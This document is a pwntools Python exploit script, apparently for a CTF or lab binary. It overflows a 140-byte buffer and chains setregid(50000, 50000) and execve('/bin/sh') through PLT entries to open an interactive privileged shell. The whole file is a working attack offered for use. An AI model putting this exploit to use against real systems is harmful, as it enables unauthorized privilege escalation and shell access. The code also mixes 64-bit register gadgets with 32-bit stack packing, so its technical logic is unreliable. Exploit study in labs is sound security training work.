from pwn import *

# Load the binary
e = ELF('./your_binary')

# PLT entries for the dynamically linked functions
setregid_plt = e.plt['setregid']  # Get setregid PLT entry
execve_plt = e.plt['execve']      # Get execve PLT entry
exit_plt = e.plt['exit']          # Exit function, clean program termination

# Gadgets
pop_rdi_ret = 0x0804836d  # Example: pop rdi; ret gadget
pop_rsi_ret = 0x080486c9  # Example: pop rsi; ret gadget

# "/bin/sh" string (we need to provide this ourselves)
binsh = 0x0804878a  # Address of "/bin/sh" string

# Padding to reach return address
padding = 140  # This needs to match the buffer overflow length

# Build the payload using the PLT entries
payload = flat(
    b'A' * padding,               # Overflow the buffer
    p32(setregid_plt),            # Call setregid from PLT
    p32(pop_rdi_ret),             # Return address for ROP (gadget to set rdi)
    p32(50000),                   # First argument to setregid (rdi)
    p32(pop_rsi_ret),             # Gadget to set rsi
    p32(50000),                   # Second argument to setregid (rsi)
    
    p32(execve_plt),              # Call execve from PLT
    p32(pop_rdi_ret),             # Gadget to set rdi
    p32(binsh),                   # Address of "/bin/sh"
    p32(0), p32(0),               # Arguments for execve("/bin/sh", 0, 0)

    p32(exit_plt)                 # Call exit to gracefully terminate
)

# Write the payload to a file for testing
with open("payload.bin", "wb") as f:
    f.write(payload)

# Launch the binary with the crafted payload
p = e.process()
p.sendline(payload)
p.interactive()
